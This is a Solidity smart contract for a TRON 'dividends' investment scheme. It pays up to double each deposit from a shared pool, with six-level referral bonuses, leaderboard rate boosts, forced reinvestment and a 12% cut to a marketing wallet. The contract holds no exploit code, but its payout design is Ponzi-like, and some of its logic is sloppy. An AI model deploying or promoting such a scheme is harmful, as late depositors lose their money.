//SourceUnit: TronSynergyDividends.sol

pragma solidity 0.5.9;

contract TronSynergyDividends {
    using SafeMath for uint256;

    struct PlayerDeposit {
        uint256 amount;
        uint256 withdrawn;
        uint256 timestamp;
    }

    struct Player {
        address referral;
        uint256 first_deposit;
        uint256 last_withdraw;
        uint256 referral_bonus;
        uint256 fee_bonus;
        uint256 dividends;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;

        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) payouts_per_level;
    }

    uint256 total_invested;
    uint256 total_investors;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;

    uint256 public startTime = 1603722600;
    uint256 public minInvestment = 100000000;
    uint256 public maxWithdrawal = 50000000000;
    uint256 public limitWithdrawalSeconds = 43200;
    uint256 public limitROI = 30;
    uint256 public insurancePercentage = 50;
    uint256 public reInvestPercentage = 30;
    uint256 private totalPercentage = 100;
    uint256 private invested;

    address payable private marketingWallet;
    address payable private reInvestWallet;
    address payable private insuranceWallet;
    uint256 insurance_wallet;

    struct TopCount {
        uint count;
        address addr;
    }
    mapping(uint8 => mapping(uint8 => TopCount)) public tops;


    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event WithdrawalDeposit(address indexed addr, uint256 amount);
    event LimitWithdrawalDeposit(address indexed addr, uint256 amount);

    address payable owner;

    mapping(address => Player) public players;

    uint8[] public referral_bonuses;

    constructor(address payable _owner, address payable _marketingWallet, address payable _reInvestWallet, address payable _insuranceWallet) public {
            owner = _owner;
            marketingWallet = _marketingWallet;
            reInvestWallet = _reInvestWallet;
            insuranceWallet = _insuranceWallet;

        referral_bonuses.push(25);
        referral_bonuses.push(25);
        referral_bonuses.push(25);
        referral_bonuses.push(25);
        referral_bonuses.push(25);
        referral_bonuses.push(25);

    }

    function deposit(address _referral) external payable {
        require(now > startTime, "not yet started");
        require(msg.value >= 1e7, "zero amount");
        require(msg.value >= minInvestment, "minimal deposit: 100 TRX");
        Player storage pl = players[msg.sender];
        require(pl.deposits.length < 500, "max 500 deposits per address");

        _setReferral(msg.sender, _referral);

        pl.deposits.push(PlayerDeposit({
            amount: msg.value,
            withdrawn: 0,
            timestamp: uint256(block.timestamp)
        }));

        if(pl.first_deposit == 0){
            pl.first_deposit = block.timestamp;
        }

        if(pl.total_invested == 0x0){
            total_investors += 1;
        }

        elaborateTopX(1, msg.sender, (pl.total_invested + msg.value));

        pl.total_invested += msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        _rewardTopListAndInsurance(msg.value);
        marketingWallet.transfer(msg.value.mul(12).div(100));

        if(pl.last_withdraw == 0){
            pl.last_withdraw = uint256(block.timestamp);

          emit Deposit(msg.sender, msg.value);
        }
        else {

        emit Deposit(msg.sender, msg.value);
        }
    }

    function _rewardTopListAndInsurance(uint256 _value) private {
        for(uint8 k = 0; k < 2; k++) {
           for(uint8 i = 0; i < 3; i++){
               address adr = tops[k][i].addr;
               if(adr != address(0) && players[adr].total_invested > 0){
                   players[adr].fee_bonus += _value.mul((i == 0 ? 5 : (i == 1 ? 2 : 1))).div(1000);
               }
           }
        }

        insurance_wallet += _value.mul(4).div(1000);
        if(insurance_wallet > 25000000){
            insuranceWallet.transfer(insurance_wallet);
        }
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            if(_referral == address(0)){ _referral = owner; }
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                if(i == 0){ elaborateTopX(0, _referral, players[_referral].referrals_per_level[i]); }
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;

            uint256 bonus;
            if(i == 0){
                bonus = _amount * ((referral_bonuses[i] * 10))/ 10000;
            } else {
                bonus = _amount * referral_bonuses[i] / 1000;
            }

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            players[ref].payouts_per_level[i] += bonus;
            total_referral_bonus += bonus;

            ref = players[ref].referral;
        }
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];
        require(now.sub(player.last_withdraw) >= limitWithdrawalSeconds, "allowed once every 12 hours");

        _payout(msg.sender);

        require(player.dividends > 0 || player.referral_bonus > 0, "zero amount");

        uint256 amount = player.dividends + player.referral_bonus + player.fee_bonus;

        uint256 WithdrawAmount = amount.mul(totalPercentage-reInvestPercentage).div(100);
        uint256 reInvestAmount = amount.mul(reInvestPercentage).div(100);
        uint256 LimitWithdrawAmount = amount-(amount-maxWithdrawal);
        uint256 LimitreInvestAmount = amount-(LimitWithdrawAmount);
        uint256 ReLimitWithdrawAmount = LimitWithdrawAmount.mul(totalPercentage-reInvestPercentage).div(100);
        uint256 ReLimitreInvestAmount = LimitWithdrawAmount.mul(reInvestPercentage).div(100)+LimitreInvestAmount;

        if(amount <= maxWithdrawal){

        player.dividends = 0;
        player.referral_bonus = 0;
        player.fee_bonus = 0;
        player.total_withdrawn += WithdrawAmount;
        total_withdrawn += WithdrawAmount;

        msg.sender.transfer(WithdrawAmount);

        emit Withdraw(msg.sender, WithdrawAmount);

         _setReferral(msg.sender, owner);

         player.deposits.push(PlayerDeposit({
             amount: reInvestAmount,
             withdrawn: 0,
             timestamp: uint256(block.timestamp)
         }));

         if(player.first_deposit == 0){
             player.first_deposit = block.timestamp;
         }

         if(player.total_invested == 0x0){
             total_investors += 1;
         }

         elaborateTopX(1, msg.sender, (player.total_invested +reInvestAmount));

         player.total_invested += reInvestAmount;
         total_invested += reInvestAmount;

         _referralPayout(msg.sender, reInvestAmount);

         _rewardTopListAndInsurance(reInvestAmount);
         reInvestWallet.transfer(reInvestAmount.mul(10).div(100));

        emit WithdrawalDeposit(msg.sender, reInvestAmount);

         }

         else {

        player.dividends = 0;
        player.referral_bonus = 0;
        player.fee_bonus = 0;
        player.total_withdrawn += ReLimitWithdrawAmount;
        total_withdrawn += ReLimitWithdrawAmount;

        msg.sender.transfer(ReLimitWithdrawAmount);

        emit Withdraw(msg.sender, ReLimitWithdrawAmount);

         _setReferral(msg.sender, owner);

         player.deposits.push(PlayerDeposit({
             amount: ReLimitreInvestAmount,
             withdrawn: 0,
             timestamp: uint256(block.timestamp)
         }));

         if(player.first_deposit == 0){
             player.first_deposit = block.timestamp;
         }

         if(player.total_invested == 0x0){
             total_investors += 1;
         }

         elaborateTopX(1, msg.sender, (player.total_invested +ReLimitreInvestAmount));

         player.total_invested += ReLimitreInvestAmount;
         total_invested += ReLimitreInvestAmount;

         _referralPayout(msg.sender, ReLimitreInvestAmount);

         _rewardTopListAndInsurance(ReLimitreInvestAmount);
         reInvestWallet.transfer(ReLimitreInvestAmount.mul(10).div(100));

        emit LimitWithdrawalDeposit(msg.sender, ReLimitreInvestAmount);
         }

    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_withdraw = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 from = player.last_withdraw > dep.timestamp ? player.last_withdraw : dep.timestamp;
            uint256 to = uint256(block.timestamp);

            if(from < to) {
                uint256 _val = dep.amount * (to - from) * _getPlayerRate(_addr) / 864000000;
                if(_val > ((dep.amount * 2) - dep.withdrawn)){
                    _val = ((dep.amount * 2) - dep.withdrawn);
                }
                player.deposits[i].withdrawn += _val;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 from = player.last_withdraw > dep.timestamp ? player.last_withdraw : dep.timestamp;
            uint256 to = uint256(block.timestamp);

            if(from < to) {
                uint256 _val = dep.amount * (to - from) * _getPlayerRate(_addr) / 864000000;
                if(_val > ((dep.amount * 2) - dep.withdrawn)){
                    _val = ((dep.amount * 2) - dep.withdrawn);
                }
                value += _val;
            }
        }
        return value;
    }

    function contractStats() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral, uint16 _contract_bonus) {
        return(total_invested, total_investors, total_withdrawn, total_referral_bonus, _contractBonus());
    }

    function playerStats(address _adr) view external returns(uint16 _strong_hand_bonus, uint16 _top_ref_bonus, uint16 _top_whale_bonus, uint16 _roi){
        return(_strongHandBonus(_adr), _topReferralBonus(_adr), _topWhaleBonus(_adr), _getPlayerRate(_adr));
    }

    function playerInfo(address _adr) view external returns(uint256 _total_invested, uint256 _total_withdrawn, uint256 _last_withdrawn, uint256 _referral_bonus, uint256 _fee_bonus, uint256 _available){
        Player memory pl = players[_adr];
        return(pl.total_invested, pl.total_withdrawn, pl.last_withdraw, pl.referral_bonus, pl.fee_bonus, (pl.dividends + pl.referral_bonus + pl.fee_bonus + this.payoutOf(_adr)));
    }

    function playerReferrals(address _adr) view external returns(uint256[] memory ref_count, uint256[] memory ref_earnings){
        uint256[] memory _ref_count = new uint256[](6);
        uint256[] memory _ref_earnings = new uint256[](6);
        Player storage pl = players[_adr];

        for(uint8 i = 0; i < 6; i++){
            _ref_count[i] = pl.referrals_per_level[i];
            _ref_earnings[i] = pl.payouts_per_level[i];
        }

        return (_ref_count, _ref_earnings);
    }

    function top10() view external returns(address[] memory top_ref, uint256[] memory top_ref_count, address[] memory top_whale, uint256[] memory top_whale_count){
        address[] memory _top_ref = new address[](10);
        uint256[] memory _top_ref_count = new uint256[](10);
        address[] memory _top_whale = new address[](10);
        uint256[] memory _top_whale_count = new uint256[](10);

        for(uint8 i = 0; i < 10; i++){
            _top_ref[i] = tops[0][i].addr;
            _top_ref_count[i] = tops[0][i].count;
            _top_whale[i] = tops[1][i].addr;
            _top_whale_count[i] = tops[1][i].count;
        }

        return (_top_ref, _top_ref_count, _top_whale, _top_whale_count);
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory starts, uint256[] memory amounts, uint256[] memory withdrawns) {
        Player storage player = players[_addr];
        uint256[] memory _starts = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _withdrawns = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];
          _amounts[i] = dep.amount;
          _withdrawns[i] = dep.withdrawn;
          _starts[i] = dep.timestamp;
        }
        return (
          _starts,
          _amounts,
          _withdrawns
        );
    }

    function _strongHandBonus(address _adr) view private returns(uint16){
        Player storage pl = players[_adr];
        uint256 lw = pl.last_withdraw;
        if(pl.last_withdraw < lw){ lw = pl.last_withdraw; }
        if(lw == 0){ lw = block.timestamp; }
        uint16 sh = uint16(((block.timestamp - lw)/43200)*15);
        if(sh > 3000){ sh = 3000; }
        return sh;
    }

    function _contractBonus() view private returns(uint16){
        return uint16(address(this).balance/1000000/100000);
    }

    function _topReferralBonus(address _adr) view private returns(uint16){
        uint16 bonus = 0;
        for(uint8 i = 0; i < 10; i++){
            if(tops[0][i].addr == _adr){
                if(i == 0){ bonus = 200; }
                else if(i == 1){ bonus = 150; }
                else if(i == 2){ bonus = 100; }
                else { bonus = 50; }
            }
        }
        return bonus;
    }

    function _topWhaleBonus(address _adr) view private returns(uint16){
        uint16 bonus = 0;
        for(uint8 i = 0; i < 10; i++){
            if(tops[1][i].addr == _adr){
                if(i == 0){ bonus = 200; }
                else if(i == 1){ bonus = 150; }
                else if(i == 2){ bonus = 100; }
                else { bonus = 50; }
            }
        }
        return bonus;
    }

    function _getPlayerRate(address _adr) view private returns(uint16){
        return (200 + _contractBonus() + _strongHandBonus(_adr) + _topReferralBonus(_adr) + _topWhaleBonus(_adr) );
    }

    function elaborateTopX(uint8 kind, address addr, uint currentValue) private {
        if(currentValue > tops[kind][11].count){
            bool shift = false;
            for(uint8 x; x < 12; x++){
                if(tops[kind][x].addr == addr){ shift = true; }
                if(shift == true && x < 11){
                    tops[kind][x].count = tops[kind][x + 1].count;
                    tops[kind][x].addr = tops[kind][x + 1].addr;
                } else if(shift == true && x == 1){
                    tops[kind][x].count = 0;
                    tops[kind][x].addr = address(0);
                }
            }
            uint8 i = 0;
            for(i; i < 12; i++) {
                if(tops[kind][i].count < currentValue) {
                    break;
                }
            }
            uint8 o = 1;
            for(uint8 j = 11; j > i; j--) {
                //if(tops[kind][j - o].addr == addr){ o += 1; }
                tops[kind][j].count = tops[kind][j - o].count;
                tops[kind][j].addr = tops[kind][j - o].addr;
            }
            tops[kind][i].count = currentValue;
            tops[kind][i].addr = addr;
        }
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}